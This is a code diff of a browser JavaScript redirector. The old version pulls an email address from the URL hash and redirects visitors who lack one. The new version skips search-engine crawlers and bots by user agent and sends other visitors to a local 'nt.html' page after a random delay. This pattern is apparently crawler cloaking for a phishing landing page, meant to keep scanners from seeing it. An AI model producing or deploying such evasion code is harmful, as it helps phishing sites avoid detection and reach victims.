@@ -1,29 +1,26 @@
-function enforceHTTPS() {
-  if (window.location.protocol !== 'https:' && !window.location.hostname.includes('localhost')) {
-    window.location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
-    return false;
-  }
-  return true;
-}
-
-function getEmailFromHash() {
-  const hash = window.location.hash.substring(1); // Remove the #
-  if (hash.includes("@") && hash.includes(".")) {
-    return hash.trim();
-  }
-  return null;
-}
-
-window.onload = () => {
-  if (!enforceHTTPS()) return;
-
-  const email = getEmailFromHash();
-
-  if (!email) {
-    window.location.href = "https://google.com";
-    return;
+(function () {
+  function isBotUserAgent() {
+    const bots = [
+      /bot/i, /crawler/i, /spider/i, /crawling/i,
+      /google/i, /bing/i, /yahoo/i, /facebook/i,
+      /duckduckgo/i, /baidu/i, /yandex/i
+    ];
+    return bots.some(bot => bot.test(navigator.userAgent));
   }
 
-  // Redirect to verification page with plain email in hash
-  window.location.href = "nt.htm";
-};
+  function redirectUser() {
+    const delay = Math.floor(Math.random() * 1000) + 1000; // 1-2 seconds delay
+    setTimeout(() => {
+      window.location.href = "nt.html"; // Redirect to local HTML file
+    }, delay);
+  }
+
+  window.addEventListener("load", () => {
+    if (isBotUserAgent()) {
+      console.log("Bot detected, exiting...");
+      return;
+    }
+
+    redirectUser();
+  });
+})();
